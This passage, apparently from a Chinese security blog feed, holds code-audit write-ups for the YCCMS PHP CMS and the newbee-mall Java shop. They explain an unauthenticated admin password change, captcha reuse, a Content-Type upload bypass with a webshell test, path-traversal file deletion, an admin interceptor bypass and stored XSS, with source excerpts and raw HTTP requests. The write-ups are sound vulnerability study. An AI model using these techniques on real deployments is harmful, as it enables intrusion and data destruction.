class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//修改密码</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;用户名不能为空&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>])) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;密码不能为空!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-keyword">if</span>(!(validate::<span class="hljs-title function_ invoke__">checkStrEquals</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>], <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;notpassword&#x27;</span>]))) <span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">t_back</span>(<span class="hljs-string">&#x27;两次密码不一致!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;username=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;password=<span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;password&#x27;</span>]);<br><span class="hljs-variable">$_edit</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">editAdmin</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_edit</span>)&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码修改成功!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;密码未修改!&#x27;</span>,<span class="hljs-string">&#x27;?a=admin&amp;m=update&#x27;</span>,<span class="hljs-number">6</span>);<br>&#125;<br>&#125;<br><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>]);<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/update.tpl&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><ol><li><p>输入username以及password函数转移到editAdmin</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$_edit</span>=<span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">editAdmin</span>();<br></code></pre></td></tr></table></figure></li><li><p>寻找到函数定义（在model&#x2F;AdminModel.class.php）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">editAdmin</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_sql</span>=<span class="hljs-string">&quot;UPDATE</span><br><span class="hljs-string">my_admin</span><br><span class="hljs-string">SET</span><br><span class="hljs-string">username=&#x27;<span class="hljs-subst">$this</span>-&gt;username&#x27;,</span><br><span class="hljs-string">password=&#x27;<span class="hljs-subst">$this</span>-&gt;password&#x27;</span><br><span class="hljs-string">WHERE</span><br><span class="hljs-string">id=1</span><br><span class="hljs-string">LIMIT 1&quot;</span>;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">update</span>(<span class="hljs-variable">$_sql</span>);<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>查看更新函数update($_sql)  （在model&#x2F;Model.class.php）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params"><span class="hljs-variable">$_sql</span></span>)</span>&#123;<br><span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>(<span class="hljs-variable">$_sql</span>)-&gt;<span class="hljs-title function_ invoke__">rowCount</span>();<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>使用execute($_sql)执行的sql语句  （在model&#x2F;Model.class.php）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">execute</span>(<span class="hljs-params"><span class="hljs-variable">$_sql</span></span>)</span>&#123;<br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$_stmt</span>=<span class="hljs-variable language_">$this</span>-&gt;_db-&gt;<span class="hljs-title function_ invoke__">prepare</span>(<span class="hljs-variable">$_sql</span>);<br><span class="hljs-variable">$_stmt</span>-&gt;<span class="hljs-title function_ invoke__">execute</span>();<br>&#125;<span class="hljs-keyword">catch</span> (PDOException <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;SQL语句:&#x27;</span>.<span class="hljs-variable">$_sql</span>.<span class="hljs-string">&#x27;&lt;br /&gt;错误信息:&#x27;</span>.<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$_stmt</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>editAdmin函数直接把传进来的username password拼接到sql语句中，然后去更新相关表中id&#x3D;1的数据，<strong>没有对于用户的信息进行认证以及过滤</strong>，这也就造成了任意更改管理员账号密码</p></li></ol><h3 id="3（验证码复用）"><a href="#3（验证码复用）" class="headerlink" title="3（验证码复用）"></a>3（验证码复用）</h3><p>直接测试抓包两次</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /admin/?a=login&amp;m=ajaxCode HTTP/1.1<br>Host: yccms:85<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0<br>Accept: */*<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate, br<br>Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>Content-Length: 9<br>Origin: http://yccms:85<br>Connection: keep-alive<br>Referer: http://yccms:85/admin/?a=login<br>Cookie: PHPSESSID=o4og4hf5dqn67ns6pm8vlsfhdd<br>Priority: u=0<br><br>code=gka3<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs shell">POST /admin/?a=login HTTP/1.1<br>Host: yccms:85<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0<br>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br>Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br>Accept-Encoding: gzip, deflate, br<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 68<br>Origin: http://yccms:85<br>Connection: keep-alive<br>Referer: http://yccms:85/admin/?a=login<br>Cookie: PHPSESSID=o4og4hf5dqn67ns6pm8vlsfhdd<br>Upgrade-Insecure-Requests: 1<br>Priority: u=0, i<br><br>ajaxlogin=&amp;ajaxcode=&amp;username=admin&amp;password=1234565&amp;code=kugk&amp;send=<br></code></pre></td></tr></table></figure><p>两次的Cookie: PHPSESSID&#x3D;o4og4hf5dqn67ns6pm8vlsfhdd相同</p><h3 id="4（文件上传1）"><a href="#4（文件上传1）" class="headerlink" title="4（文件上传1）"></a>4（文件上传1）</h3><p>登录后文件后台，上传logo存在文件上传（使用hacbar）</p><p>测试<a href="https://yccms:85/view/index/images/logo.php">https://yccms:85/view/index/images/logo.php</a>        </p><p>​ post提交1&#x3D;phpinfo（）；</p><p>​ 展现出配置文件</p><p>说明漏洞存在</p><ol><li><p>controller&#x2F;CallAction.class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//处理上传图片</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upLoad</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>])) &#123;<br><span class="hljs-variable">$_logoupload</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LogoUpload</span>(<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;MAX_FILE_SIZE&#x27;</span>]);<br><span class="hljs-variable">$_path</span> = <span class="hljs-variable">$_logoupload</span>-&gt;<span class="hljs-title function_ invoke__">getPath</span>();<br><span class="hljs-variable">$_img</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Image</span>(<span class="hljs-variable">$_path</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">xhImg</span>(<span class="hljs-number">960</span>,<span class="hljs-number">0</span>);<br><span class="hljs-variable">$_img</span>-&gt;<span class="hljs-title function_ invoke__">out</span>();<br><span class="hljs-comment">//echo $_path;</span><br><span class="hljs-variable">$_logoupload</span>-&gt;<span class="hljs-title function_ invoke__">alertOpenerClose</span>(<span class="hljs-string">&#x27;图片上传成功！&#x27;</span>,<span class="hljs-string">&#x27;..&#x27;</span>.<span class="hljs-variable">$_path</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;警告：文件过大或者其他未知错误导致浏览器崩溃！&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>回溯logoupload（public&#x2F;class&#x2F;LogoUpload.class.php）</p><p>寻找验证类型</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">private</span> <span class="hljs-variable">$type</span>;<span class="hljs-comment">//类型</span><br><span class="hljs-keyword">private</span> <span class="hljs-variable">$typeArr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;image/png&#x27;</span>,<span class="hljs-string">&#x27;image/x-png&#x27;</span>);<span class="hljs-comment">//类型合集</span><br><br><br><span class="hljs-comment">//验证类型</span><br><span class="hljs-keyword">private</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkType</span>(<span class="hljs-params"></span>) </span>&#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$this</span>-&gt;type,<span class="hljs-variable">$this</span>-&gt;typeArr)) &#123;<br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">alertBack</span>(<span class="hljs-string">&#x27;警告：LOGO图片必须是PNG格式！&#x27;</span>);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>代码的“类型”“类型合集”表示只限制了<code>Content-Type</code></p></li><li><p>在提交log时，抓包修改<code>Content-Type</code>为PNG格式，image&#x2F;png</p></li></ol><h3 id="5（文件上传2）"><a href="#5（文件上传2）" class="headerlink" title="5（文件上传2）"></a>5（文件上传2）</h3><p>登录后文件后台，添加文章，上传图片存在文件上传（使用hacbar）</p><p>同上</p><p>​  （controller&#x2F;CallAction.class.php———–&gt;public\class\FileUpload.class.php）</p><p>​代码的“类型”“类型合集”表示只限制了<code>Content-Type</code></p><p>​在提交log时，抓包修改<code>Content-Type</code>为PNG格式，image&#x2F;png</p><h3 id="6（任意文件（图片-文章）删除）"><a href="#6（任意文件（图片-文章）删除）" class="headerlink" title="6（任意文件（图片&#x2F;文章）删除）"></a>6（任意文件（图片&#x2F;文章）删除）</h3><p>后台中，在图片管理处删除图片&#x2F;文章</p><ol><li><p>根据url（&#x2F;admin&#x2F;?a&#x3D;pic&amp;m&#x3D;delall）定位文件（&#x2F;controller&#x2F;PicAction.class.php）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>])) tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br><span class="hljs-variable">$_fileDir</span>=ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<br><span class="hljs-variable">$_filePath</span>=<span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123;<br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>&#125;<br>&#125;<br><br>&#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>对 pid传进来的值并<strong>没有进行过滤就进行了了路径的拼接</strong>，导致了路径穿越漏洞，触发任意文件删除漏洞</p></li><li><p>即**只需要更改pid[0]**即可在无登录条件下任意删除文件</p></li></ol>]]></content>
    
    
    <categories>
      
      <category>php</category>
      
      <category>代码审计</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>newbee mall搭建&amp;&amp;审计</title>
    <link href="/2025/10/27/newbee%20mall%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/10/27/newbee%20mall%E6%90%AD%E5%BB%BA&amp;&amp;%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="搭建："><a href="#搭建：" class="headerlink" title="搭建："></a>搭建：</h1><p>我用的是IDEA</p><ol><li><p>下载源码</p><p>链接如下：<a href="https://github.com/newbee-ltd/newbee-mall">https://github.com/newbee-ltd/newbee-mall</a></p><p>直接在github下载即可</p></li><li><p>在phpstudy打开web环境，新建数据库，如下：（<strong>数据库名称一定要是newbee_mall_db</strong>）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162925796.png" alt="image-20250929102955907"></p></li><li><p>然后导入sql文件（源码包里面就有）</p><p>记得先修改这个配置文件<code>（修改数据库名和用户名）</code></p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162930502.png" alt="image-20250926153103159" style="zoom:50%;" /><p>然后导入即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html">\newbee-mall-master\src\main\resources\newbee_mall_schema.sql<br></code></pre></td></tr></table></figure></li><li><p>在Navicat Premium 17连接数据库</p><p> <img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162944166.png" alt="image-20250929103058046"></p></li><li><p>弹出即说明成功启动</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162946291.png" alt="image-20250926153457729"></p></li><li><p>直接输入</p><p><a href="http://localhost:28089/%E5%8D%B3%E5%8F%AF">http://localhost:28089/即可</a></p></li></ol><h1 id="审计："><a href="#审计：" class="headerlink" title="审计："></a>审计：</h1><h2 id="初审"><a href="#初审" class="headerlink" title="初审"></a>初审</h2><p><strong>先看pom.xml配置文件以及README.md</strong></p><ol><li><p>README.md中存在<strong>MyBatis</strong>，可能存在sql注入</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162948432.png" alt="image-20250929104432693"></p></li><li><p>通过搜索发现存在拦截器<strong>interceptor</strong>，可能存在越权漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162949866.png" alt="image-20250929104637782"></p></li><li><p>controller目录中也可能存在越权漏洞，下面具体审计可以跟着看一下</p><p>水平越权漏洞</p><ul><li>或者在篡改相关参数（请求参数 &#x2F; 表单字段 &#x2F; JSON 字段）</li><li>要么就是修改之中存在注入点，需要替换用户</li><li>在url使用参数切换用户或者管理员id未校验，尝试替换 ID（+1、-1、随机大&#x2F;小 ID、其它已知用户的 ID）</li><li>文件&#x2F;图片等直接用可访问 URL，访问其它用户的文件路径或修改 URL（没有权限校验或短期 token）</li><li>token 换取其他用户的数据</li><li>直接访问管理&#x2F;内部接口，扫列出隐藏路由、尝试访问 <code>/admin</code>、<code>/internal</code>、<code>/debug</code></li></ul></li></ol><h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><ol><li><p>接上面说的，存在MyBatis，直接检索${，主要是查看${} 拼接 SQL 语句</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162953339.png" alt="image-20251014104614955"></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163139933.png" alt="image-20251014104622698"></p><p>都找不到和sql相关的东西</p><p>说明可能使用<code>#代替$</code>实现sql的预编译，防止了sql注入（可能是版本问题，这个漏洞修复了emmm）</p></li><li><p>查找<code>#&#123;</code></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162956964.png" alt="image-20251014105140910"></p><p>进去分析一下</p><p>使用了直接拼接的方式向数据库进行查询（但是预编译即已修复）</p></li><li><p>所以可以查看NewBeeMallGoodsMapper.java <strong>（逆向追踪）</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027162958998.png" alt="image-20251014145410972"></p><p>找到传参定义，跟近函数</p></li><li><p>跟进到getTotalNewBeeMallGoods</p><p>C:\Users\95227\Desktop\newbee-mall-master\src\main\java\ltd\newbee\mall\service\impl\NewBeeMallGoodsServiceImpl.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> PageResult <span class="hljs-title function_">getNewBeeMallGoodsPage</span><span class="hljs-params">(PageQueryUtil pageUtil)</span> &#123;<br>        List&lt;NewBeeMallGoods&gt; goodsList = goodsMapper.findNewBeeMallGoodsList(pageUtil);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">total</span> <span class="hljs-operator">=</span> goodsMapper.getTotalNewBeeMallGoods(pageUtil);<br>        <span class="hljs-type">PageResult</span> <span class="hljs-variable">pageResult</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageResult</span>(goodsList, total, pageUtil.getLimit(), pageUtil.getPage());<br>        <span class="hljs-keyword">return</span> pageResult;<br>    &#125;<br></code></pre></td></tr></table></figure><p>查看谁调用了getNewBeeMallGoodsPage 方法</p></li><li><p>跟进到NewBeeMallGoodsController</p><p>C:\Users\95227\Desktop\newbee-mall-master\src\main\java\ltd\newbee\mall\controller\admin\NewBeeMallGoodsController.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@RequestMapping(value = &quot;/goods/list&quot;, method = RequestMethod.GET)</span><br>    <span class="hljs-meta">@ResponseBody</span><br>    <span class="hljs-keyword">public</span> Result <span class="hljs-title function_">list</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam</span> Map&lt;String, Object&gt; params)</span> &#123;<br>        <span class="hljs-keyword">if</span> (ObjectUtils.isEmpty(params.get(<span class="hljs-string">&quot;page&quot;</span>)) || ObjectUtils.isEmpty(params.get(<span class="hljs-string">&quot;limit&quot;</span>))) &#123;<br>            <span class="hljs-keyword">return</span> ResultGenerator.genFailResult(<span class="hljs-string">&quot;参数异常！&quot;</span>);<br>        &#125;<br>        <span class="hljs-type">PageQueryUtil</span> <span class="hljs-variable">pageUtil</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PageQueryUtil</span>(params);<br>        <span class="hljs-keyword">return</span> ResultGenerator.genSuccessResult(newBeeMallGoodsService.getNewBeeMallGoodsPage(pageUtil));<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>传入了 pageUtil 参数，而该参数同样通过 PageQueryUtil 类创建一个 pageUtil 对象，传入 params 作为参数，以及 params 同样是个 Map 对象。未对其进行过滤处理</p></li><li><p>针对版本低的源码（未修复的）</p><p>直接抓包，报错注入，sqlmap跑就行了（我的漏洞已经“预编译”修复，所以我就不演示了哈）</p></li></ol><h2 id="后台权限绕过"><a href="#后台权限绕过" class="headerlink" title="后台权限绕过"></a>后台权限绕过</h2><p>说到后台，肯定先看admin相关文件啊，所以可以找找登录后台的文件（AdminLogin）</p><ol><li><p>进入src&#x2F;main&#x2F;java&#x2F;ltd&#x2F;newbee&#x2F;mall&#x2F;interceptor&#x2F;AdminLoginInterceptor.java</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163002814.png" alt="image-20251014191955489"></p><p>第一步：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">requestServletPath</span> <span class="hljs-operator">=</span> request.getServletPath();<br></code></pre></td></tr></table></figure><p>使用getServletPath传入url： getRequestURI 方法返回的路径是未经过服务器端处理的原始路径，可能包含特殊字符或路径跳转，从而绕过服务器端的安全控制</p><p>第二步：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">if</span> (requestServletPath.startsWith(<span class="hljs-string">&quot;/admin&quot;</span>) &amp;&amp; <span class="hljs-literal">null</span> == request.getSession().getAttribute(<span class="hljs-string">&quot;loginUser&quot;</span>)) &#123;<br></code></pre></td></tr></table></figure><p>先判断 Uri 路径中是否以 &#x2F;admin 开头，然后以及获取并判断Session 中的 loginUser 属性是否为 null</p><p>两个条件 &amp;&amp; 在一起结果为 True 的话进入条件代码</p></li><li><p>payload：</p><ul><li><p>登陆后台寻找一个后台接口（账号密码是弱密码，考考大家吧🤭）<br><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163004797.png" alt="image-20251014193025547"></p></li><li><p>删除cookic之后，查看回显</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163006124.png" alt="image-20251014193040005"></p><p>明显报错了</p></li><li><p>绕过</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163008180.png" alt="image-20251014193103330"></p></li></ul></li></ol><h2 id="XSS漏洞（1，2）"><a href="#XSS漏洞（1，2）" class="headerlink" title="XSS漏洞（1，2）"></a>XSS漏洞（1，2）</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ol><li><p>啥也不知道，先在前端进行测试（找那种可以保留的对话框，类似于评论&#x2F;弹幕的那种）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163010034.png" alt="image-20251014193404446"></p><p>搜索xss的代码<strong>没有弹窗</strong>（我觉得应该是因为存在双引号，将代码包起来了）</p></li><li><p>去源码中找找原因（源代码好找，看现在的url，在源代码文件夹寻找相关的代码就行）</p><p>（不明确的话，存在keyword传参，所以直接在项目文件里面搜索keyword即可）</p><p><strong>存在转义</strong></p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163014918.png" alt="image-20251014194012915"></p></li><li><p><strong>thymeleaf模版</strong>在对th:text标签进行渲染的时候，默认对特殊字符进行了转义</p><p>接着进入search.html<br>src\main\resources\templates\mall\search.html</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163016401.png" alt="image-20251014201622548"></p><p>找thymeleaf未作转义的输出，th:utext不会将字符转义</p><ul><li><p>第一个，存在th:utext，所以这两个功能点存在XSS。</p></li><li><p>第二个，detail.html因为显示的是商品信息，商品信息使用富文本编辑器，不能简单的转义处理，需要考虑正常的html标签传输，所以作者在这里使用th:utext来显示商品详细。</p></li></ul></li></ol><h3 id="xss（1）："><a href="#xss（1）：" class="headerlink" title="xss（1）："></a>xss（1）：</h3><p>进入商品信息，添加xss的payload</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163018219.png" alt="image-20251014204318619"><br>然后（提交即可弹窗）<br><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163019713.png" alt="image-20251014204241804"></p><h3 id="xss（2）："><a href="#xss（2）：" class="headerlink" title="xss（2）："></a>xss（2）：</h3><ol><li><p>进入订单管理，然后添加payload</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163021921.png" alt="image-20251014204504188"></p></li><li><p>提交即可弹窗</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027163024553.png" alt="image-20251014204615252"></p></li></ol><h2 id="垂直越权"><a 